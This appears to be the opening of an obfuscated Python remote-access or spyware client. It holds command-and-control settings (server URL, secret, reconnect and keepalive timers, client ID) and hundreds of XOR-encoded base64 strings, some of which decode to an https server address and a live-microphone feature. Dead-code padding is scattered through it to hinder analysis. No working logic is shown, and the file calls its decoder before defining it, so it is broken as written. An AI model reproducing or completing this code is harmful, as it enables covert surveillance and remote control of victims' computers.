
import os, io, sys, re, json, time, base64, ctypes, shutil, socket, sqlite3
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque
_SERVER  = _D("_s1")   
_SECRET  = _D("_s2")        
_RECON   = 5                                  
_RECON_MAX = 120                              
_CLIENT_ID = None                             
_VERSION = _D("_s3")                           
_KEEPALIVE = 300                              
def _D(b):
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
_s1 = "OFBMTEhLAhcXSllLSFBdSl0WV1ZKXVZcXUoWW1dV"
_s2 = "E2FyYGN7dmF2PnB/enZ9Zz54dmo+ISMhJw=="
_s3 = "n66xr7Gu"
_s4 = "keHo/+Hk5Q=="
_s5 = "rd3U3cjfzsHE3Q=="
_s6 = "YgEQGxIWDQ=="
_s7 = "RjY/KDYzMg=="
_s8 = "qdnQysje"
_s9 = "lOTt5PHm9/j95A=="
_s10 = "HGxvaWh1cA=="
_s11 = "cQEIEAQVGB4="
_s12 = "iun48/r+5Q=="
_s13 = "mt/IyNXIoLrq8+q68/Tp7vv29rrq4+7y9fS36fX58f/u8/XB+fbz//Tuxw=="
_s14 = "3/r3vqy8q7ayuvas/4T697O6qbqzsb6yuvasgv/697K6rKy+uLr2rA=="
_s15 = "rNzVwtzZ2A=="
_s16 = "36i2u6u3"
_s17 = "YRYID1JT"
_s18 = "5JeHloGBig=="
_s19 = "ne7+7/j48w=="
_s20 = "leb25/Dw+w=="
_s21 = "8YaUk5KQnA=="
_s22 = "lefw+fD05vA="
_s23 = "ewgYCR4eFQ=="
_s24 = "6JuLmo2Nhg=="
_s25 = "UhAVAAo="
_s26 = "WhAKHx0="
_s27 = "E2BwYXZ2fUx1YXJ+dg=="
_s28 = "jaPn/eo="
_s29 = "gPfl4uPh7d/m8uHt5Q=="
_s30 = "1r+7t7Gz"
_s31 = "DEBlemksYWVvfmN8ZGNiaSx/eH5pbWFlYmssemVtLHx1bXloZWMs7oqeLFtNWixvZHliZ38s7oqeLG5tf2k6OCI="
_s32 = "9oaPl4OSn5k="
_s33 = "dhsfFSkFAhcCAwU="
_s34 = "NVhcVmpGQVRBQEY="
_s35 = "hejs5tr28eTx8PY="
_s36 = "1IOmtaT0prWj9ISXmfS9uvS19Lm9ur25tbj0g5WC9LyxtbCxpvSnu/S2prujp7Gmp/S3tbr0sLG3u7Cx9L2g+g=="
_s37 = "s4+HwPqHwIfA+vv7+vr7+4fA+g=="
_s38 = "C1lCTU0="
_s39 = "7YmMmYw="
_s40 = "P1JWXGBbXkte"
_s41 = "rd3e2NnEwQ=="
_s42 = "v8zGzMva0uDMy97LzA=="
_s43 = "27a+trSpooSrvqm4vrWv"
_s44 = "st/X393Ay+3G3cbT3u3V0A=="
_s45 = "rcnE3sbyy9/IyPLKzw=="
_s46 = "CmRvflV5b2R+VWdo"
_s47 = "tcbQ28bax8Y="
_s48 = "t/T4+uTn8vQ="
_s49 = "ttnG09jGws8="
_s50 = "9oWTgoWfkg=="
_s51 = "ThoLHAM="
_s52 = "8YKFlZif"
_s53 = "QTUkOTU="
_s54 = "16C+ueTl"
_s55 = "656fjcbT"
_s56 = "yrm+pbo="
_s57 = "3qq7rLO3sL+ygbGrqq6rqg=="
_s58 = "8IOEn4A="
_s59 = "G35jcm8R"
_s60 = "+7mamJCciZSOlZ/bkJ6Cl5ScnJ6J24ySj5Pbi56J1oySlZ+UjNuciZSOi5KVnNualZ/bi56JkpSfkpjbnZeOiJPV"
_s61 = "45OajZOWlw=="
_s62 = "SyAuMickLBQ4Pyo/Pjg="
_s63 = "WzA+Ijc0PAQoLzovLig="
_s64 = "w6imuq+spJywt6K3trA="
_s65 = "USY4P2Jj"
_s66 = "KUpBSFs="
_s67 = "zaaotKGiqpKprLms"
_s68 = "hevk6OA="
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s69 = "j+z/+tD/6v3s6uH7"
_s70 = "kP7x/fU="
_s71 = "xauqseWjqrCroQ=="
_s72 = "rd3Uzsza"
_s73 = "w7Wsr7aupg=="
_s74 = "PExFX11L"
_s75 = "fg4HHR8J"
_s76 = "o9TKzZCR"
_s77 = "75ecips="
_s78 = "kOf5/qOi"
_s79 = "E3dyYWR6fQ=="
_s80 = "Mh1hS0FGV18dfltQQFNASx1xXUBXYVdARFtRV0Edf1dcRxJ3SkZAU0EdZ0FXQBxfV1xHHXFdXEZXXEZBHWBXQV1HQFFXQR1xdWFXQUFbXVw="
_s81 = "5YmKgoyLhpGJ"
_s82 = "USY4P2Jj"
_s83 = "HHh9bmt1cg=="
_s84 = "rNzB38nY"
_s85 = "CnlzeX5vZ2l+Zg=="
_s86 = "AkFqY2xlZyJmZ3Fpdm1yInVjbm5yY3JncCJkcG1vIm5tYWNuInJjdmoibXAiV1BOLA=="
_s87 = "strGxsKInZ0="
_s88 = "2fezqb4="
_s89 = "8LaZnJXQnp+E0JafhZ6U"
_s90 = "06S6veDh"
_s91 = "N2BWW1tHVkdSRRdUX1ZZUFJT"
_s92 = "1rK3pKG/uA=="
_s93 = "OVZKWEpaS1BJTQ=="
_s94 = "PWpcUVFNXE1YTx1eVVxTWlhZ"
_s95 = "Gn1pf25uc3R9aQ=="
_s96 = "6cTEi47EmoqIhYw="
_s97 = "pPPFyMjUxdTB1oTXwdA="
_s98 = "IGRlAE5PVABTVVBQT1JURUQ="
_s99 = "zp2mobnur+6+ob67vu6jq729r6mr7qyhtuA="
_s100 = "odbIz5KT"
_s101 = "bgoPHBkHAA=="
_s102 = "aAcbCRsLGgEYHA=="
_s103 = "DnRrYGd6dw=="
_s104 = "mcrx9u73"
_s105 = "76CfioHPur2jz4aBz4uKiY6ag5vPjZ2AmJyKncE="
_s106 = "vOjd19mc09LZnM/fztnZ0s/U08ic3dLYnM7ZyMnO0pzVyJI="
_s107 = "VjslJXY4OSJ2NyA3Pzo3NDoz"
_s108 = "w4GEkZs="
_s109 = "3Zq4qf28ra2vsqW0sLypuP26uLKxsr68qbSys/2rtLz9lI3z"
_s110 = "yaG9vbm68+bmoLnkqLmg56qmpOajuqan5g=="
_s111 = "NVBHR1pH"
_s112 = "9rqfhYLWn5iFgpeampOS1peGhpqflZeCn5mYhdg="
_s113 = "ptHPyJWU"
_s114 = "5KCNl5SIhZ2qhYmB"
_s115 = "9JCVhoOdmg=="
_s116 = "wLO5s7SlrZ+wsq+mqaylsg=="
_s117 = "mv7q8f0="
_s118 = "NWVZVEwVVBVXUFBFFUZaQFtRFR1iXFtRWkJGHBs="
_s119 = "ZhEPCFVU"
_s120 = "0JK1taC1tA=="
_s121 = "KFhJWERJUQ=="
_s122 = "D19jbnZqaw=="
_s123 = "FEdxdWZ3fDRye2Y0cn14cWc0eXVgd3x9enM0dTRkdWBgcWZ6NDxwcWRgfDl4fXl9YHFwNHJ7ZjRndXJxYG09Og=="
_s124 = "cTQJFBIEBRRREFECGRQdHVESHhwcEB8VURAfFVEDFAUEAx9RHgQFAQQFXw=="
_s125 = "ZjIvKyMpMzI="
_s126 = "eDoUFxsTVw0WGhQXGxNYFRcNCx1YGRYcWBMdARoXGQocWBEWCA0MWFAvERYcFw8LWBcWFAFUWAodCQ0RCh0LWBkcFREWUVY="
_s127 = "Kl1DRBkY"
_s128 = "IWhPUVRVAUNNTkJKREU="
_s129 = "WRs1NjoyeT84MDU8PXlxNzw8PSp5OD00MDdw"
_s130 = "bjoLAgALGg=="
_s131 = "Yio2NjI="
_s132 = "MXllZWFi"
_s133 = "qOXR+/nk"
_s134 = "E0F2d3pg"
_s135 = "LmNBQElBamw="
_s136 = "JnN2SHY="
_s137 = "uOvr/Og="
_s138 = "P3xXTVBSWlxeTEs="
_s139 = "qeqZk5yfk5ue"
_s140 = "v4+PhY6OhYyN"
_s141 = "3O+f5unu5uTu"
_s142 = "5afd39fS36Cn"
_s143 = "O3oPAQMIAX4M"
_s144 = "xPaH/oL0/vGA"
_s145 = "TXx1dw95d359"
_s146 = "naXcp67bp6ze"
_s147 = "fEVIRklLRk4/"
_s148 = "zf399/yM9/z8"
_s149 = "vIyMhomMhomK"
_s150 = "Dz8/NT5NNTs7"
_s151 = "OwsLAQp/AQx+"
_s152 = "uY+Jg42Mg/v9"
_s153 = "YFBQWlAjWlJZ"
_s154 = "Xx0cZWZtZWkd"
_s155 = "88PDycKxycXA"
_s156 = "fDhMRjhMRkxP"
_s157 = "/czFx8/Lx8nE"
_s158 = "cTdJS0VHS0Ay"
_s159 = "rZ/ul5iZl5Sc"
_s160 = "6dnZ09vd06us"
_s161 = "qZmZk5idk+/t"
_s162 = "KRkZExhsE2ob"
_s163 = "VhU6NyUlPzAvdjd2Ozc1Pj84M3YiLyYzdjQ3JTMydjk4dj8iJXY5JjM4diY5JCIldjc4MnY5Ij4zJHY1OiMzJXg="
_s164 = "MkBdR0ZXQA=="
_s165 = "aBgaAQYcDRo="
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
_s166 = "yaWgp7yxlrqsu7+suw=="
_s167 = "gOzp7vX43/Pl8vbl8g=="
_s168 = "t8De2dPYwMTox9Q="
_s169 = "ZRYcCwoJCgIc"
_s170 = "z4GOnO/g74mmo6rvnKq9uaq9"
_s171 = "yL+hpqynv7uXu626vq26"
_s172 = "GW5wd312bmpGaXo="
_s173 = "A3RqbWdsdHBcc2A="
_s174 = "0razprOws6G3"
_s175 = "aBwYRQQBBgM="
_s176 = "84GchoeWgQ=="
_s177 = "3qm7vIGtu6you6w="
_s178 = "PHVTaBwTHHFZWFVdHHhZSlVfWQ=="
_s179 = "EHFgYHx1"
_s180 = "LEFDTkVASQ=="
_s181 = "HnlxcXlyew=="
_s182 = "1oW7t6Si9p65u7P2krOgv7Wz"
_s183 = "CXtoenlrbHt7cA=="
_s184 = "x6uuqbK/mLSitbGitQ=="
_s185 = "mOv39uE="
_s186 = "SRokKDs9aR0faWZpBCwtICg="
_s187 = "K0lZRF9DTlk="
_s188 = "leXn/Pvh8Oc="
_s189 = "eA0WExYXDxY="
_s190 = "YDEVCQMLQDQjMEADDw4OBQMUQBMDAQ5ADw5AAUAMCRMUQA8GQBAPEhQTTkAyBRQVEg4TQAwJExRADwZADxAFDkAQDxIUE04="
_s191 = "jMvp+Kzi6fj74/7nrOXi+On+6u3v6f+grO3v+OX66azv4+Li6e/45ePi/6Cszd7crPjt7uDpoKzt4uis/OP++KH/7+3irP7p//ng+P+i"
_s192 = "PFVSSFlOWl1fWU8="
_s193 = "2amqrK2wtQ=="
_s194 = "MV9QXFQ="
_s195 = "WTg9PSs8Kio8Kg=="
_s196 = "fxkeEhYTBg=="
_s197 = "h+bj4/Xi9PQ="
_s198 = "h+ni8+rm9Ow="
_s199 = "OFpKV1lcW1lLTA=="
_s200 = "pczL0cDXw8TGwNY="
_s201 = "exIVDx4JHRoYHggkHgkJFAk="
_s202 = "9YWGgIGcmQ=="
_s203 = "O1hUVVVeWE9SVFVI"
_s204 = "TSssICQhNA=="
_s205 = "fgoHDhs="
_s206 = "J0tIREZL"
_s207 = "t8XS2tjD0g=="
_s208 = "F2RjdmNiZA=="
_s209 = "O1hUVVVeWE9SVFVIZF5JSVRJ"
_s210 = "xrGvqPX0"
_s211 = "bxgGAVxd"
_s212 = "VzMuOTY6PjQ="
_s213 = "JkJfSEdLT1dTQw=="
_s214 = "eg4DCh8="
_s215 = "i+r5+9Tu+fnk+Q=="
_s216 = "69nZ38U="
_s217 = "OG1WU1ZXT1Y="
_s218 = "tOHa39rbw9o="
_s219 = "SCQnKykkFyYtPD8nOiM="
_s220 = "YBYFDgQPEg=="
_s221 = "4Y6RhI++kY6TlZI="
_s222 = "+JeInZani52KjpGbnYs="
_s223 = "Qy4iICsqLSYcNzozJg=="
_s224 = "dBkVFxwdGhErGBUWERg="
_s225 = "A25iYGtqbWZcamBsbQ=="
_s226 = "l/bl58jj7ufy"
_s227 = "BWtgcXJqd24="
_s228 = "ierm5+fs6v3g5uf6"
_s229 = "g/Hm7uz35g=="
_s230 = "1ufk4fg="
_s231 = "TH17fmI="
_s232 = "laW7pbulu6U="
_s233 = "YAUYFAUSDgEMPwgPExQT"
_s234 = "C3tkeX8="
_s235 = "usnfyMzT2d8="
_s236 = "vs3K38rLzQ=="
_s237 = "iOTn6+nk1+ns7Po="
_s238 = "IE5FVFdPUks="
_s239 = "sNXIxNXC3tHc79jfw8TD"
_s240 = "nfzx8cLt8u/p7g=="
_s241 = "eBkUFCcIFwoMCw=="
_s242 = "Cm9yfm94ZGtmVWJleX55"
_s243 = "jej1+ej/4+zh0uXi/vn+"
_s244 = "3raxraqwv7O7"
_s245 = "IFBPUlQ="
_s246 = "jv7h/Po="
_s247 = "eTwBDQsYGg1ZChgPHB1ZCRgKCg4WCx0KWRgXHVkaFhYSEBwKWR8LFhRZOhELFhQcVVk8HR4cVVk/EAscHxYBVw=="
_s248 = "EHN4Yn99dQ=="
_s249 = "XxMQHB4THg8PGx4LHg=="
_s250 = "8rOiorazprM="
_s251 = "ZSIKCgIJAA=="
_s252 = "OVpRS1ZUXA=="
_s253 = "6YqBm4aEjA=="
_s254 = "1Jm9t6a7p7uyoA=="
_s255 = "XDk4Ozk="
_s256 = "8JWUl5U="
_s257 = "v/LQxdbT094="
_s258 = "xqCvtKOgqb4="
_s259 = "+J6Rip2el4A="
_s260 = "puPe0tTHxdKG1sfV1dHJ1MLVhsDUycuG5c7UycvP08uLxMfVw8KGxNTJ0dXD1NWGjuXO1MnLw4qG48LBw4qG5NTH0MOKhunWw9THiIiIj4g="
_s261 = "TT0sPj46Ij8pPg=="
_s262 = "zoqrqK+7oro="
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
_s263 = "YS0OBggPQSUAFQA="
_s264 = "8qa3v6I="
_s265 = "BlVDSkNFUiZpdG9hb2hZc3RqKiZzdWN0aGdrY1lwZ2pzYyomdmd1dXFpdGJZcGdqc2MmQFRJSyZqaWFvaHU="
_s266 = "rc7f1N3Zwg=="
_s267 = "ZxcGFBQQCBUDFA=="
_s268 = "cxYBARwB"
_s269 = "DkBrenlhfGU="
_s270 = "E1B8fHh6dmA="
_s271 = "RxMCChc="
_s272 = "+Ku9tL27rNiQl4uMp5OdgdTYlpmVndTYnZabioGIjJ2cp46ZlI2d2L6qt7XYm5eXk5Gdi9i0sbWxrNjKyMg="
_s273 = "rs3BwcXHy90="
_s274 = "mfzr6/br"
_s275 = "o+fGwNHa09eD4MvRzM7GjObHxMaD08LQ0NTM0ceD1tDKzcSD9MrNx8zU0IPn8+Lz6oOIg+Lm8I6RlpWO5ODujQ=="
_s276 = "IHtOTwBEQVRBfQ=="
_s277 = "14yjuLj3pL+4paOK"
_s278 = "EUpkf3p/fmZ/MXd+Y3xwZTE="
_s279 = "B0tIREZLRldXQ0ZTRg=="
_s280 = "9bKampKZkA=="
_s281 = "WRQwOis2KjY/LQ=="
_s282 = "VRcnNCMwBjozISI0JzA="
_s283 = "LWJdSF9MDX5CS1laTF9I"
_s284 = "LmJBTU9CDn1aT1pL"
_s285 = "Wy4vPXZj"
_s286 = "MV5CblJDSEFF"
_s287 = "UhYCEwIb"
_s288 = "KklIbkteSw=="
_s289 = "UyMxFzInMg=="
_s290 = "gfT156y5"
_s291 = "6LOLiYaGh5zIjI2LmpGYnLU="
_s292 = "oeTZ1dPAwtWB0sDXxMWBzc7GyM/SgcfTzsyB58jTxMfO2YHR087HyM3E0o8="
_s293 = "j//u/Pz44P3r/A=="
_s294 = "lfn68vz75rv/5vr7"
_s295 = "kOXk9r2o"
_s296 = "KUVGTkBHWg=="
_s297 = "ZxcGFBQQCBUDFA=="
_s298 = "/paRjYqQn5Ob"
_s299 = "DXh+aH9jbGBo"
_s300 = "Xi4/LS0pMSw6"
_s301 = "EWFjfnd4fXQ="
_s302 = "F3J5dGVuZ2Nycw=="
_s303 = "YQIODgoIBBJPEhANCBUE"
_s304 = "34uako8="
_s305 = "q/ju5+7o/4vDxNjfh4vFysbOh4vdysfezovt+eTmi8bE0fTIxMTAws7Yi+fi5uL/i5mbmw=="
_s306 = "BmVpaW1vY3U="
_s307 = "z6egvLs="
_s308 = "FmB3emNz"
_s309 = "NVBHR1pH"
_s310 = "XxswKDEzMD47fz5/OTYzOn85LTAyfwoNE38+MTt/MC8rNjAxPjMzJn86Jzo8Kis6fzYrcQ=="
_s311 = "rPjp4fw="
_s312 = "5ZKMi9bX"
_s313 = "luH/+KWk"
_s314 = "94eWg58="
_s315 = "rcPMwMg="
_s316 = "fBkODhMO"
_s317 = "Si84OCU4"
_s318 = "Vjg3OzM="
_s319 = "AXV4cWQ="
_s320 = "37Kwu7a5trq7"
_s321 = "uNbZ1d0="
_s322 = "zrq3vqs="
_s323 = "vc3cydU="
_s324 = "uc7Yy9fQ194="
_s325 = "+7WUj9udlI6Vnw=="
_s326 = "1JCxuLGgsbA="
_s327 = "B2Nmc2Y="
_s328 = "+56JiZSJ"
_s329 = "1Je8sbe/9KexpqKxpvSyu6b0tfS6saP0t7i9sbqg9KKxpqe9u7r69IaxoKGmuqf0/Lqxo4uisaanvbu6+PSwu6O6uLu1sIuhprj99Lum9Pyau7qx+PSau7qx/fo="
_s330 = "IA9BUEkPQ0xJRU5UDVVQREFURQ=="
_s331 = "1KKxpqe9u7o="
_s332 = "dBAbAxoYGxUQKwEGGA=="
_s333 = "Vhg5diMmMjciM3Y/ODA5djU5ODA/MSMkMzJ2OTh2JTMkIDMk"
_s334 = "Wh41LTQ2NTs+ei4yP3o0Py16dD8iP3o7ND56KS47PT96O3o4Oy45MnopOSgzKi56LjV6KD8qNjs5P3EoPykuOygudA=="
_s335 = "VwMSGgc="
_s336 = "u57F3Ys="
_s337 = "7pmHgN3c"
_s338 = "YDUQBAEUBUATAxIJEBRADAEVDgMIBQRATUAFGAkUCQ4HQBQPQAEQEAwZQBUQBAEUBQ=="
_s339 = "ImNXVk0PV1JGQ1ZHAktRAnVLTEZNVVEPTUxOWwJETVACTE1V"
_s340 = "ImFKR0FJAktEAlBXTExLTEUCVUtWSgJDRk9LTAJSUEtUS05HRUdRAgp1S0xGTVVRAk1MTlsLDA=="
_s341 = "1qG/uOXk"
_s342 = "qd7Ax5qb"
_s343 = "htPHxabk//bn9fWm7/Wm0e/o4unx9avp6Or/"
_s344 = "keb4/+P09rH//uWx8Ofw+P3w8/30sff+47HE0NKx8+jh8OLi"
_s345 = "6MXFjYSNnomcjYw="
_s346 = "lLm55/Hm4vHm"
_s347 = "j6Ki6uPq+e776us="
_s348 = "7amIgYiKjJmIqJWIjpiZiA=="
_s349 = "renIwcjKzNnI6NXIztjZyA=="
_s350 = "htHPyMLP1A=="
_s351 = "86aysNORioOSgIDTh4GalJSWgZaX097Tlouah5qdlNOQhoGBlp2H05qdgIeSnZCW"
_s352 = "yJqtpae+reiup6ygraS4rbrouq2vobu8urHoo62xu+ikra686Kqx6Lygreiqsbipu7vm"
_s353 = "tPDR2NHT1cDR8czR18HA0Q=="
_s354 = "oPXh44DSxcfJ09TS2YDDzMXBzsXEgNXQ"
_s355 = "zZ2ov6SiqaSurKGhtO29pKOq7bmlqO2+qL+7qL/tpaisobml7aijqb2ipKO57bmi7b2/qLuoo7ntn6ijqai/7au/oqDtvqGoqL2ko6rj"
_s356 = "Q2wiMypsKyYiLzcr"
_s357 = "0Ju1taD9sby5prXwoLm+t/Cfmw=="
_s358 = "JEJWS15BSg=="
_s359 = "/4iWkczN"
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s360 = "Ontqan57bns="
_s361 = "BStkaGR/amtocHZsZg=="
_s362 = "i/Wkperm6vHk5eb++OLo"
_s363 = "1JW5ta67upmhp723nLG4pLGm+rGssQ=="
_s364 = "cVxcAhQDBxQD"
_s365 = "Q25uKic="
_s366 = "me7w96qr"
_s367 = "4KGNgZqPjq2Vk4mDqIWMkIWS"
_s368 = "66q7u6+qv6o="
_s369 = "qOnFydLHxuXd28HL4M3E2M3aht7K2w=="
_s370 = "Rg8oNTInKiojInxmFTInNDIzNmYQBBU="
_s371 = "BnVlbnJndW11"
_s372 = "fg0dFgofDRUN"
_s373 = "I2pNUFdCT09GRxkDd0JQSA=="
_s374 = "WTorNjctODs="
_s375 = "rO3BzdbDwuHZ38XP5MnA3Mne"
_s376 = "1rWkubiit7Q="
_s377 = "YSgPEhUADQ0EBVtBAhMODxUAAw=="
_s378 = "wrzt7KGtrKSrpe2xu7G2p6+m7bexp7A="
_s379 = "psfLx9zJyMvT1c/Fi87DytbD1IjVw9TQz8XD"
_s380 = "PU5ETklYUF5JUQ=="
_s381 = "3a6krqm4sL6psQ=="
_s382 = "35axrKu+s7O6u+X/rKasq7qyuw=="
_s383 = "NUJcWwYH"
_s384 = "hcTo5P/q68jw9uzmzeDp9eD3"
_s385 = "gsPS0sbD1sM="
_s386 = "yrmpor6ruaG5"
_s387 = "o8DRzM3XwsE="
_s388 = "CUhkaHNmZ0R8emBqQWxleWx7"
_s389 = "xoerp7ypqIuzta+ljqOqtqO0"
_s390 = "RyQ1KCkzJiU="
_s391 = "RzloaSQoKSEuIGg0PjQzIiojaDI0IjVoJiomPSgpKjI0LiRqLyIrNyI1aTQiNTEuJCI="
_s392 = "bB8VHxgJAQ8YAA=="
_s393 = "rd7U3tnIwM7ZwQ=="
_s394 = "L1xMXUpKQQ=="
_s395 = "84SWkZCSng=="
_s396 = "i+jk5eXu6P8="
_s397 = "bi0BAAALDRoLCg=="
_s398 = "nf7x9Pjz6cLv+Pr07un47w=="
_s399 = "F355cXg="
_s400 = "RDE3ITYqJSkh"
_s401 = "ocfEwNXU08TS"
_s402 = "guP35uvt"
_s403 = "ZQEMFgYKCwsABhE="
_s404 = "ImZLUUFNTExHQVZHRg=="
_s405 = "r93KyMbc293O28bAwfDAxA=="
_s406 = "3L+wtbmyqIO1uA=="
_s407 = "usnO28jO5cnZyN/f1OXZ28rOz8jf"
_s408 = "DGFjYmV4Y34="
_s409 = "3q29rLu7sIG9v66qq6y7ga2qv6qrrQ=="
_s410 = "4JOUj5C/k4OShYWOv4OBkJSVkoU="
_s411 = "6ZqKm4yMh7aKiJmdnJuMtpqdiJ2cmg=="
_s412 = "OUpcTWZKWktcXFdmVFZXUE1WSw=="
_s413 = "+5aUlZKPlIk="
_s414 = "JUhKS0xRSlc="
_s415 = "FWZ2Z3Bwe0p2dGVhYGdwSmZhdGFgZg=="
_s416 = "HG95aENvf255eXJDbWl9cHVoZQ=="
_s417 = "VicjNzo/Ii8="
_s418 = "zr2tr6Kr"
_s419 = "VSYhNCchCiIwNzY0OA=="
_s420 = "ST4sKyooJBY6PSg9PDo="
_s421 = "1aahuqWKorC3trS4"
_s422 = "oNfFwsPBzf/T1MHU1dM="
_s423 = "nO/56MPr+f7//fHD7en98PXo5Q=="
_s424 = "ucjM2NXQzcA="
_s425 = "CWRgalZ6fWh7fQ=="
_s426 = "KEVBS3dbXEdY"
_s427 = "D2JmbFB8e257enw="
_s428 = "NV5QTFlaUmpGQVRHQQ=="
_s429 = "+pGfg5aVnaWJjpWK"
_s430 = "tdjawMbQ6tDD0NvB"
_s431 = "5ZWci5WQkQ=="
_s432 = "I0JAV0pMTQ=="
_s433 = "p8rI0cI="
_s434 = "HnNxaHtBbHtyf2p3aHs="
_s435 = "uNvU0dvT"
_s436 = "SSUsLz0="
_s437 = "x6Wys7OoqQ=="
_s438 = "0qKgt6Gh"
_s439 = "UiA3PjczITc="
_s440 = "Dn1tfGFiYg=="
_s441 = "j+Tq9u3g7v3r0Or56uH7"
_s442 = "GGhhdmhtbA=="
_s443 = "UjEmID4="
_s444 = "44aNl4aR"
_s445 = "+JydlJ2MnQ=="
_s446 = "F3N4YHk="
_s447 = "bw4MGwYAAQ=="
_s448 = "P09NWkxM"
_s449 = "EGJ1fHVxY3U="
_s450 = "xaaqqKeq"
_s451 = "/ZaYhI4="
_s452 = "0KSpoLU="
_s453 = "hPfs6/bw5/Hw"
_s454 = "ehkOCBYlGxYOJR4fFg=="
_s455 = "+JmUjKeMmZo="
_s456 = "ewwSFSQf"
try:
    raise Exception()
except:
    pass
_s457 = "cwQaHSwW"
_s458 = "OllOSFZlWQ=="
_s459 = "qMvc2sT30A=="
_s460 = "MFNEQlxvUQ=="
_s461 = "fhAfExs="
_s462 = "cQUUAxwYHxAdLgIFEAMF"
_s463 = "RTEgNygsKyQpGjYxJDEwNg=="
_s464 = "EmZ3YH97fHN+TXt8Ymdm"
_s465 = "jO/j4eHt4ug="
_s466 = "B3NidWpuaWZrWHRzaHc="
_s467 = "oNTF0s3JzsHM/9PUwdTV0w=="
_s468 = "aBscCRocNxsRGxwNBTcFBwYBHAca"
_s469 = "RCkrKi0wKzYbNzAlMDE3"
_s470 = "HW5pcm1CbmRuaXhwQnByc3Rpcm8="
_s471 = "0L2/vrmkv6KPo6SxpKWj"
_s472 = "hOPh8Nv09uvn4ff34fc="
_s473 = "K1tZREhOWFh0R0JYXw=="
_s474 = "rsXHwsLx3tzBzcvd3Q=="
_s475 = "5paUiYWDlZW5jY+KirmUg5WTipI="
_s476 = "qsnGw9rIxcvYzvXNz94="
_s477 = "QDA5MCUyIywpMA=="
_s478 = "SygnIjspJCo5LxQvKj8q"
_s479 = "LE9ARVxOQ01eSHNITVhN"
_s480 = "6omGg5qIhYuYjrWOi56L"
_s481 = "D2xjZn9tYG59a1B8ans="
_s482 = "rNzV3Mnez8DF3A=="
_s483 = "qNzN0Nw="
_s484 = "RyQrLjclKCY1Ixg0MyYzMjQ="
_s485 = "t9Tb3sfV2NbF0+jEw9bDwsQ="
_s486 = "1LWhsL27i7OxoIuiu7ihubE="
_s487 = "VTQgMTw6CiM6OSA4MA=="
_s488 = "u9rO39LU5Mjez+TN1NfO1t4="
_s489 = "5IiBkoGI"
_s490 = "k/Lm9/r8zOf89PT/9sz+5uf2"
_s491 = "sNHF1Nnf78bf3MXd1Q=="
_s492 = "yLinv626l6WnpqG8p7qXp66u"
_s493 = "TDwjOyk+Ez4pPzkgOA=="
_s494 = "dQUaAhAHKhkaFh4="
_s495 = "6JiHn42at5qNm52EnA=="
_s496 = "VCQ7IzEmCyc4MTEk"
_s497 = "NUVaQlBHakdQRkBZQQ=="
_s498 = "PUpcUVFNXE1YT2JOWEk="
_s499 = "9oaXgp4="
_s500 = "pcjWwsfK3frWzcrS"
_s501 = "UCQ5JDw1"
_s502 = "bgEeCwAxGxwC"
_s503 = "vN/R2OPO2c/J0Mg="
_s504 = "N0NWXFJoRFRFUlJZRF9YQw=="
_s505 = "vM/fztnZ0s/U08jjztnPydDI"
_s506 = "FnFzYklxc3l/Zg=="
_s507 = "+5yelJKLpImeiI6Xjw=="
_s508 = "Xzg6KwA+Ly8s"
_s509 = "j+7///zQ/er8+uP7"
_s510 = "STklKDAWOiY8Jy0="
_s511 = "8ZeDlIA="
_s512 = "Ll1LT1xNRnFIR0JLXQ=="
_s513 = "JVdKSlE="
_s514 = "K05TTkheX050SERGRkpFTw=="
_s515 = "0rG9v7+zvLY="
_s516 = "7IiDm4KAg42Is4mUiY8="
_s517 = "ZBQFEAw="
_s518 = "GXB3aWxtRnt1dnpy"
_s519 = "2Lu1vIeqvauttKw="
_s520 = "ocjP0dTV/tTPw83Owso="
_s521 = "agkHDjUYDxkfBh4="
_s522 = "UTc4PTQOPTgiJQ=="
_s523 = "bwkGAwowAwYcGzAdChwaAxs="
_s524 = "7oiHgouxioGZgIKBj4qxnIufm4udmg=="
_s525 = "xaOsqaCaoaqyq6mqpKGapq2wq64="
_s526 = "3ri3sruBuruyu6q7"
_s527 = "IlJDVko="
_s528 = "NVNcWVBqW1BCalNaWVFQRw=="
_s529 = "BXVkd2BrcQ=="
_s530 = "WD4xND0HLSg0Nzk8BzswLTYz"
_s531 = "q9vK38M="
_s532 = "XDo1MDkDKSwwMz04Ay45LykwKA=="
_s533 = "MV9URUZeQ1puWF9XXg=="
_s534 = "xqijsrGptK2Zr6igqZm0o7WzqrI="
_s535 = "64mZhJyYjpm0mJ+Oioc="
_s536 = "fD4OEwsPGQ5cDwgZHRAZDlwOGQ0JGQ8IGRg="
_s537 = "awkZBBwYDhk0GB8OCgc0GQ4YHgcf"
_s538 = "QiYmLTEdMTYjMDY="
_s539 = "H2t+bXh6aw=="
_s540 = "USE+IyU="
_s541 = "KV1BW0xITVo="
_s542 = "MUFQUlpURW5CWEtU"
_s543 = "XzI6KzcwOw=="
_s544 = "Xjo6MS0BLSo/Kist"
_s545 = "aw8PBBg0GB8EGw=="
_s546 = "juXn4uLR/fnn+u3m"
_s547 = "DUZEQUEtXlpEWU5F"
_s548 = "KGVdRFxBBVxAWk1JTE1MCGxsR3sISVxcSUtDCE1GT0FGTQhbXVhYR1pcQUZPCHxreAQIfWx4BAhgfHx4BAh7REdfREdaQVsG"
_s549 = "v8/e3NTay8w="
_s550 = "ne38/vb46e4="
_s551 = "rsrKwd3x3drP2tvd"
_s552 = "+p6elYmliY6bjo+J"
_s553 = "2Jyct4v4q6y3qKi9vA=="
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s554 = "gdbu8+rk86H16fPk4OWh9eng9aHy5O/l8qHx4OLq5PXyoeLu7/Xo7/Tu9PLt+K8="
_s555 = "zKS4uLw="
_s556 = "fAwdHxcZCA8="
_s557 = "JkJHUkd5RF9SQ1U="
_s558 = "u8va2NDez8g="
_s559 = "+4uamJCej4g="
_s560 = "TCgtOC0TLjU4KT8="
_s561 = "UiIzMTk3JiE="
_s562 = "WTEtLSk="
_s563 = "/5eLi4+M"
_s564 = "2Ki5u7O9rKs="
_s565 = "ZAAFEAU7Bh0QARc="
